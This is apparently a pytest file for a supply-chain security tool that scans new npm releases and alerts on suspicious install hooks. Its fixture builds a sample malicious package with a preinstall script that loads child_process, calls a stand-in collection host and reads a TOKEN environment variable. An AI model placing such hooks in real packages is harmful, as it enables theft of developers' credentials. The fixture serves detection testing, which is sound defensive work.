import io
import json
import tarfile
from pathlib import Path

import soc_store
from secopsai.research_npm_enrichment import run_npm_enrichment_cycle
from secopsai.research_surveillance import ensure_collectors
from secopsai.research_scoring import score_pending_events
from secopsai.research_intake import SafeFetcher


def _tarball(*, package: str, version: str, malicious: bool) -> bytes:
    package_json = {
        "name": package,
        "version": version,
        "scripts": {"preinstall": "node setup.js"} if malicious else {},
    }
    setup = (
        "const cp = require('child_process');\n"
        "fetch('https://example.invalid/collect');\n"
        "const token = process.env.TOKEN;\n"
    ) if malicious else "module.exports = true;\n"
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, content in (
            ("package/package.json", json.dumps(package_json).encode()),
            ("package/setup.js", setup.encode()),
        ):
            info = tarfile.TarInfo(name)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    return buffer.getvalue()


def _event(db: str, package: str, seq: int) -> None:
    now = soc_store.utc_now()
    with soc_store.connect(db) as connection:
        connection.execute(
            """INSERT INTO registry_feed_events
               (feed_event_id, collector_id, ecosystem, package, version, event_type,
                registry_timestamp, page_url, leaf_url, leaf_fetched, metadata_json,
                idempotency_key, collected_at, processing_state)
               VALUES (?, 'COL-NPM-CHANGES', 'npm', ?, '', 'published', ?, ?, ?, 0, ?, ?, ?, 'pending')""",
            (
                f"RFE-TEST-{seq}",
                package,
                now,
                "https://replicate.npmjs.com/_changes",
                f"https://registry.npmjs.org/{package}",
                json.dumps({"seq": seq}),
                f"npm-test-{package}-{seq}",
                now,
            ),
        )
        connection.commit()


def test_npm_enrichment_resolves_exact_version_and_inspects_new_lifecycle_release(tmp_path, monkeypatch):
    db = str(tmp_path / "research.db")
    quarantine = tmp_path / "quarantine"
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(quarantine))
    ensure_collectors(db_path=db)
    package = "example-package"
    state = {"version": "1.0.0", "malicious": False}

    def fetch(url, max_bytes):
        if url.endswith(".tgz"):
            return 200, {"content-type": "application/gzip"}, _tarball(package=package, version=state["version"], malicious=state["malicious"])
        if url.startswith("https://registry.npmjs.org/"):
            version = state["version"]
            item = {
                "name": package,
                "version": version,
                "scripts": {"preinstall": "node setup.js"} if state["malicious"] else {},
                "dist": {
                    "tarball": f"https://registry.npmjs.org/{package}/-/{package}-{version}.tgz",
                    "integrity": "sha512-test",
                    "shasum": "test-sha",
                },
                "author": {"name": "Example Maintainer"},
                "dependencies": {},
            }
            payload = {
                "name": package,
                "dist-tags": {"latest": version},
                "time": {version: "2026-08-04T19:00:00.000Z"},
                "versions": {version: item},
            }
            return 200, {"content-type": "application/json"}, json.dumps(payload).encode()
        raise AssertionError(url)

    _event(db, package, 1)
    baseline = run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fetch))
    assert baseline["packages_fetched"] == 1
    assert baseline["versions_created"] == 1
    score_pending_events(db_path=db, limit=50)

    state.update(version="1.1.0", malicious=True)
    _event(db, package, 2)
    result = run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fetch))
    assert result["versions_created"] == 1
    assert result["static"]["analyses_started"] == 1
    assert result["static"]["candidates_created"] == 1

    with soc_store.connect(db) as connection:
        exact = connection.execute(
            "SELECT version, event_type, processing_state FROM registry_feed_events WHERE package=? AND version<>'' ORDER BY version",
            (package,),
        ).fetchall()
        analysis = connection.execute(
            "SELECT status, score, intake_json FROM research_npm_release_analyses WHERE package=? AND version='1.1.0'",
            (package,),
        ).fetchone()
        candidate = connection.execute(
            "SELECT package, version, reference_identifier, evidence_json FROM research_candidates WHERE package=? AND version='1.1.0'",
            (package,),
        ).fetchone()
        alert = connection.execute(
            "SELECT alert_type, severity FROM research_alerts WHERE alert_type='npm_proactive_anomaly'"
        ).fetchone()

    assert [(row["version"], row["event_type"]) for row in exact] == [
        ("1.0.0", "version_observed"),
        ("1.1.0", "version_updated"),
    ]
    assert analysis["status"] == "completed"
    assert int(analysis["score"]) >= 40
    intake = json.loads(analysis["intake_json"])
    assert intake["artifact_sha256"]
    assert intake["execution_performed"] is False
    assert candidate["reference_identifier"] == "npm-proactive-static.v1"
    evidence = json.loads(candidate["evidence_json"])
    assert evidence["validation_state"] == "static_confirmed"
    assert evidence["analysis"]["execution_performed"] is False
    assert alert["alert_type"] == "npm_proactive_anomaly"
    assert alert["severity"] in {"high", "critical"}


def test_npm_enrichment_keeps_registry_failures_visible_and_retryable(tmp_path):
    db = str(tmp_path / "research.db")
    ensure_collectors(db_path=db)
    _event(db, "unavailable-package", 1)

    def fail(_url, _max_bytes):
        return 503, {"content-type": "text/plain"}, b"temporary outage"

    result = run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fail))
    assert result["failures"] == 1
    with soc_store.connect(db) as connection:
        row = connection.execute(
            "SELECT processing_state, metadata_json FROM registry_feed_events WHERE package='unavailable-package'"
        ).fetchone()
    assert row["processing_state"] == "enrichment_failed"
    metadata = json.loads(row["metadata_json"])
    assert metadata["npm_enrichment_status"] == "failed"
    assert "registry returned HTTP 503" in metadata["npm_enrichment_error"]
